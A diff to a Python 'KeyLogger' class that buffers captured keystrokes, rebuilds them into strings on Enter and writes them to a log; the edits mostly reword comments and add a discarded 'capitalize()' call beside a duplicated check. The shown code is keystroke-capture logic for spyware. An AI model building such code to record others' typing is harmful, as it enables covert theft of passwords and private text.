@@ -29,10 +29,11 @@ class KeyLogger:
         try:
             print('alphanumeric key {0} pressed'.format(key.char))
             # self.messageArray is an array of strings ['s','t','g'] f.e
-            # self.outputMessage is a string which will be converted when pressing enter
             self.messageArray.append(abc)
         except AttributeError:
             # Pressed space, enter, backspace etc...     
+            if(abc == 'Key.space'):
+                abc.capitalize()
             if(abc == 'Key.space'):
                 self.messageArray.append(abc)
             
@@ -44,23 +45,25 @@ class KeyLogger:
                     logging.info('New line: {0}'.format(self.messageArray))
                     self.messageArray = self.messageArray[:-1]
                 else: 
+                    
                     self.outputMessage = ""
 
             
             if(abc == 'Key.enter'):
                 #logging.info('{0} pressed'.format(key))
+                # self.outputMessage is a string which will be converted when pressing enter
                 self.outputMessage = self.concatenate(self.messageArray)
                 print(self.outputMessage)
                 logging.info(self.outputMessage)
                 self.messageArray = []   
             
-    # concatenate() return a single concatenated string
-    # ['s','t','g'] => "stg"     
+    # concatenate() returns a single concatenated string
     def concatenate(self, s):
         print('concatenating...')
         new = "" 
         # traverse in the string  
         for x in s: 
+            # remove ', Enter, Space and Backspace
             x = x.replace("'", "").replace("Key.enter", "").replace("Key.space", " ").replace("Key.backspace", "")
             new += x 
 
